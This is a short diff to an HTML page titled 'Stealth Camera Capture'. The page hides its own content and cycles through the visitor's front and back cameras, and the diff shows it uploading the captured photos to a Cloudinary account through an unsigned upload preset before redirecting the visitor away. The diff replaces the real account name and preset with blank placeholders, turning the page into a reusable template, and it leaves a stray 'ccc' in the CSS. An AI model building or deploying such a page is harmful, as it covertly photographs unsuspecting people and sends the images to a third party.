@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <title>Stealth Camera Capture</title>
 <style>
-  body { display: none; } /* hide everything */
+  body { display: none; } ccc
 </style>
 </head>
 <body>
@@ -18,8 +18,10 @@ const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
 
 // Cloudinary info
-const CLOUD_NAME = "gamersio";
-const UPLOAD_PRESET = "webcamuploads";
+  // enter cloud name
+const CLOUD_NAME = "";
+  // enter unsigned upload_preset
+const UPLOAD_PRESET = "";
 
 let cameras = ["user", "environment"]; // front + back
 let camIndex = 0;
@@ -42,8 +44,8 @@ function startCamera() {
             photoCount = 0;
             setTimeout(startCamera, 1000);
           } else {
-            // done with all photos, redirect
-            window.location.href = "https://google.com";
+            // enter url for redirection
+            window.location.href = "";
           }
           return;
         }
